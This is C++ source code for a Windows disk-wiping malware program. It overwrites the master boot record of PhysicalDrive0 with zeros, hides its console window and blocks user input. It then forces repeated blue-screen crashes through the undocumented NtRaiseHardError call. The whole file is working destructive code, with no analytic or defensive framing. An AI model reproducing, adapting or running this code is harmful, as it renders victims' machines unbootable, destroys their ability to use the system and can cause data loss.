#include <Windows.h>
#include <iostream>
#pragma comment(lib, "ntdll.lib")

using namespace std;

#define MBR_SIZE 512

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); //Hides console window
}

void BlueScreen()
{
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
}

int main()
{
    DWORD write;
    char mbrData[MBR_SIZE]; //Size of MBR is 512 bytes to be overwritten
    ZeroMemory(&mbrData, (sizeof mbrData));

    HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0"
        , GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
        , NULL, OPEN_EXISTING, NULL, NULL);
    if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE) {
        HideConsole();
        while (1) {
            cout << (char)7;
            BlockInput(true);
            BlueScreen();
        }
        Sleep(10000);
        ExitProcess(0);
    }
    else {
        HideConsole();
        while (1) {
            cout << (char)7;
            BlockInput(true);
            BlueScreen();
        }
        Sleep(10000);
        ExitProcess(0);
    }
    CloseHandle(MasterBootRecord);
    return EXIT_SUCCESS;
}